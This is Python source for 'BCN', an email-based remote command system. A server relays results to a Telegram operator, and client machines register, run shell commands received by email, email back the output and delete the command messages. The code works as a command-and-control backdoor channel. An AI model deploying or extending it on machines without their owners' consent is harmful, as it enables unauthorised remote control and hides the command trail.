def initiate_server():
    from BCN.Communication.EmailCom import EmailCommunicator
    import time
    from BCN.Communication.TelegramCom import start_bot_thread, bot
    from BCN.Proccesing.utils import Utils
    import logging
    from BCN.Proccesing.Identifier import Identifier
    import os, json

    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Создаем чистый файл twmcd.json перед запуском сервера
    io = Utils()
    twmcd_path = "./data/twmcd.json"
    
    # Создаем пустой словарь для twmcd, сохраняя только адрес сервера (0.0.0)
    empty_twmcd = {
        "0.0.0": {
            "name": "server",
            "os": ""
        }
    }
    
    # Перезаписываем файл twmcd.json
    io.save_json(twmcd_path, empty_twmcd)
    logging.info(f"Recreated twmcd.json file with clean state")
    
    mail = EmailCommunicator()
    mail.set_my_address("0.0.0")  # Сервер всегда имеет адрес 0.0.0
    configs = io.load_json("./data/env.json")
    identifier = Identifier()  # Для генерации адресов - теперь будет использовать чистый файл

    # Запуск Telegram бота в отдельном потоке
    logging.info("Starting Telegram bot thread")
    start_bot_thread()
    
    logging.info("Server initiated. Starting email check loop.")

    while True:
        try:
            logging.debug("Checking for new emails...")
            if mail.check_for_messages():
                logging.debug("Email detected.")
                try:
                    # Используем новую логику: mail.receive() теперь обрабатывает ВСЕ сообщения
                    # и удаляет те, которые адресованы серверу, после их обработки
                    receive, flag = mail.receive()
                    
                    # ИСПРАВЛЕНО: Добавлена проверка для обработки сообщений с флагом "ERR", "IR" и "ACK"
                    if flag in ["IR", "ERR"]:
                        logging.debug(f"Email received with flag: {flag}, content: {receive}")
                        # Отправляем сообщение в Telegram
                        bot.send_message(configs["MAIN_USER_ID"], f"Flag: {flag}, Receive: {str(receive)}" if flag in "ERR" else f"Ответ:\n{str(receive)}") 
                        logging.info(f"Sent message with flag {flag} to Telegram")
                    elif flag == "ACK":
                        logging.debug(f"Received ACK message: {receive}")
                        # Извлекаем информацию о команде из подтверждения
                        if receive and isinstance(receive, str):
                            # Улучшенная обработка ACK сообщений
                            if "Command" in receive and "acknowledged by" in receive:
                                # Стандартное ACK сообщение для IC команд
                                try:
                                    command = receive.split("'")[1] if "'" in receive else "unknown"
                                    computer = receive.split("acknowledged by ")[1] if "acknowledged by " in receive else "unknown"
                                    # Отправляем улучшенное сообщение в Telegram о получении подтверждения
                                    bot.send_message(
                                        configs["MAIN_USER_ID"], 
                                        f"✅ ACK: Компьютер '{computer}' подтвердил получение команды '{command}'"
                                    )
                                    logging.info(f"Sent ACK notification to Telegram for IC command '{command}' on computer '{computer}'")
                                except Exception as parse_error:
                                    logging.error(f"Error parsing ACK message: {parse_error}")
                                    bot.send_message(configs["MAIN_USER_ID"], f"ACK: {receive}")
                            elif "Address" in receive and "acknowledged by" in receive:
                                # ACK сообщение для адреса
                                try:
                                    address = receive.split("Address ")[1].split(" acknowledged")[0] if "Address " in receive else "unknown"
                                    computer = receive.split("acknowledged by ")[1] if "acknowledged by " in receive else "unknown"
                                    # Отправляем сообщение в Telegram о подтверждении адреса
                                    bot.send_message(
                                        configs["MAIN_USER_ID"], 
                                        f"📍 ACK: Компьютер '{computer}' подтвердил получение адреса '{address}'"
                                    )
                                    logging.info(f"Sent ACK notification to Telegram for address '{address}' on computer '{computer}'")
                                except Exception as parse_error:
                                    logging.error(f"Error parsing address ACK message: {parse_error}")
                                    bot.send_message(configs["MAIN_USER_ID"], f"ACK: {receive}")
                            else:
                                # Общее ACK сообщение (на всякий случай)
                                bot.send_message(
                                    configs["MAIN_USER_ID"], 
                                    f"🔔 ACK: {receive}"
                                )
                                logging.info(f"Sent generic ACK notification to Telegram: {receive}")
                        else:
                            # Обрабатываем случай, когда receive не является строкой
                            bot.send_message(
                                configs["MAIN_USER_ID"], 
                                f"🔔 Получено ACK сообщение с неожиданным форматом: {str(receive)}"
                            )
                            logging.warning(f"Received ACK message with unexpected format: {type(receive)}")
                    
                except Exception as email_error:
                    logging.error(f"Error processing email: {email_error}")
            else:
                logging.debug("No emails in mailbox.")
        except Exception as e:
            logging.error(f"Error in server loop: {e}")
            # Continue the loop even if there's an error
            
        # Sleep before next check
        time.sleep(3.5)

def initiate_suboard():
    from BCN.Communication.EmailCom import EmailCommunicator
    from BCN.Proccesing.utils import Utils
    import socket, platform, os, time, subprocess
    import logging
    
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
    
    bcn = EmailCommunicator()
    io = Utils()
    
    # Get computer information
    computer_name = socket.gethostname()
    os_info = platform.platform()
    computer_info = f"{computer_name}, {os_info}"
    
    # Сразу устанавливаем значение None, чтобы иметь доступ к этой переменной
    my_address = None
    
    logging.info(f"Initializing suboard mode with computer info: {computer_info}")
    logging.info("Sending identification request to server...")
    
    # Send identification request to the server (0.0.0)
    bcn.send(
        computer_info,
        "0.0.0",  # Server address
        "IND",
        f"Requesting network address for {computer_name}"
    )
    
    # Wait for confirmation from server
    received_address = False
    
    logging.info("Waiting for server to assign network address...")
    # Try to get assigned address (timeout after 30 seconds)
    timeout = time.time() + 30
    
    # Логируем текущее состояние адреса
    logging.info(f"Current address setting: {bcn.my_address}")
    
    # Даем серверу время на обработку запроса и отправку ответа
    time.sleep(3)

    while not received_address and time.time() < timeout:
        if bcn.check_for_messages():
            # Используем обновленный метод receive(), который теперь просматривает все сообщения
            # и удаляет те, которые обработаны
            response, flag = bcn.receive()
            logging.info(f"Received response with flag: {flag}, content: {response}")
            
            # Проверяем, был ли установлен адрес после обработки сообщения
            if bcn.my_address:
                logging.info(f"Address was set through message processing: {bcn.my_address}")
                my_address = bcn.my_address
                received_address = True
                # Отправляем подтверждение серверу
                bcn.send(
                    my_address,
                    "0.0.0",
                    "ACK",
                    f"Address {my_address} acknowledged by {computer_name}"
                )
                break
        time.sleep(1)
    
    # Проверяем, установлен ли адрес через EmailCommunicator, даже если received_address = False
    if not received_address and bcn.my_address:
        logging.info(f"Address was set through EmailCommunicator: {bcn.my_address}")
        my_address = bcn.my_address
        received_address = True
    
    if not received_address:
        logging.error("Failed to receive valid network address from server. Exiting.")
        return
    
    logging.info(f"Successfully connected to BCN network with address: {my_address}")
    logging.info(f"Verification - final EmailCommunicator address: {bcn.my_address}")
    
    # Main loop to process commands
    while True:
        try:
            if bcn.check_for_messages():
                # Используем обновленный метод receive для обработки всех сообщений
                result = bcn.receive()
                
                # Проверяем тип результата - это может быть кортеж с 3 элементами (command, flag, email_id)
                if isinstance(result, tuple) and len(result) == 3:
                    command, flag, email_id = result
                    logging.info(f"Received command to execute: '{command}' with flag '{flag}' and email_id '{email_id}'")
                    
                    # Проверяем, что это действительно команда (флаг IC)
                    if flag == "IC" and command:
                        # ИСПРАВЛЕНО: удаляем символы возврата каретки и перевода строки, которые могут вызывать проблемы
                        command = command.replace('\r', '').replace('\n', '')
                        logging.info(f"Executing command: '{command}'")
                        try:
                            # Отправляем подтверждение ACK серверу
                            bcn.send(
                                None,
                                "0.0.0",
                                "ACK",
                                f"Command '{command}' acknowledged by {computer_name}"
                            )
                            logging.info(f"ACK sent to server for command: {command}")
                            
                            # Выполняем команду и получаем результат
                            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                            
                            # Обрабатываем результат выполнения
                            if result.returncode == 0:
                                output = result.stdout
                                logging.info(f"Command executed successfully. Output: {output}")
                            else:
                                output = f"Error: {result.stderr}"
                                logging.error(f"Command execution failed with return code {result.returncode}. Error: {result.stderr}")
                            
                            # Отправляем результат на сервер
                            logging.info(f"Sending command result to server: {output}")
                            try:
                                bcn.send(
                                    output,
                                    "0.0.0",
                                    "IR",
                                    f"Command execution result from {computer_name}"
                                )
                                logging.info(f"Command result sent to server with flag IR")
                            except Exception as send_error:
                                logging.error(f"Error sending command result: {send_error}")
                            
                            # Удаляем сообщение с командой после её выполнения
                            with bcn.create_imap_connection() as mail:
                                mail.select("INBOX/ToMyself")
                                mail.store(email_id, "+FLAGS", "\\Deleted")
                                mail.expunge()
                                logging.info(f"📮 Deleted command message after execution")
                            
                        except subprocess.TimeoutExpired:
                            error_msg = "Command execution timed out after 10 seconds"
                            logging.error(error_msg)
                            bcn.send(
                                error_msg,
                                "0.0.0",
                                "ERR",
                                f"Command execution failed on {computer_name}"
                            )
                            
                            # Удаляем сообщение с командой после попытки выполнения
                            with bcn.create_imap_connection() as mail:
                                mail.select("INBOX/ToMyself")
                                mail.store(email_id, "+FLAGS", "\\Deleted")
                                mail.expunge()
                                logging.info(f"📮 Deleted command message after timeout error")
                            
                        except Exception as cmd_error:
                            error_msg = str(cmd_error)
                            logging.error(f"Error executing command: {error_msg}")
                            bcn.send(
                                error_msg,
                                "0.0.0",
                                "ERR",
                                f"Command execution failed on {computer_name}"
                            )
                            logging.info("Error message sent to server")
                            
                            # Удаляем сообщение с командой после попытки выполнения
                            with bcn.create_imap_connection() as mail:
                                mail.select("INBOX/ToMyself")
                                mail.store(email_id, "+FLAGS", "\\Deleted")
                                mail.expunge()
                                logging.info(f"📮 Deleted command message after execution error")
                                
                elif isinstance(result, tuple) and len(result) == 2:
                    # Обычный результат (command, flag)
                    command, flag = result
                    
                    # Обработка обычных команд (без ID сообщения)
                    if flag == "IC" and command:
                        logging.info(f"Executing command (legacy processing): '{command}'")
                        # ... existing code for legacy commands ...
                    elif flag == "EDCN":
                        logging.info("Received emergency disconnect command from server.")
                        break
                
                # Ждем немного перед следующей проверкой
                time.sleep(1)
            else:
                # Ждем дольше, если нет сообщений
                time.sleep(3.5)
                
        except Exception as e:
            logging.error(f"Error in main suboard loop: {e}")
            time.sleep(5)  # Wait a bit longer if there's an error

def stop_suboard():
    try:
        from BCN.Communication.EmailCom import EmailCommunicator
        mail = EmailCommunicator()
        mail.send(None, "0.0.0", "FIN", "I am shutting down")
        return True
    except Exception as e:
        print(f"Error stopping suboard: {e}")
        return False

def stop_server():
    try:
        from BCN.Communication.EmailCom import EmailCommunicator
        from BCN.Communication.TelegramCom import stop_bot
        
        mail = EmailCommunicator()
        mail.send(None, "255.255.255", "EDCN", "Server is shutting down")
        
        # Останавливаем Telegram бот
        stop_bot()
        
        return True
    except Exception as e:
        print(f"Error stopping server: {e}")
        return False
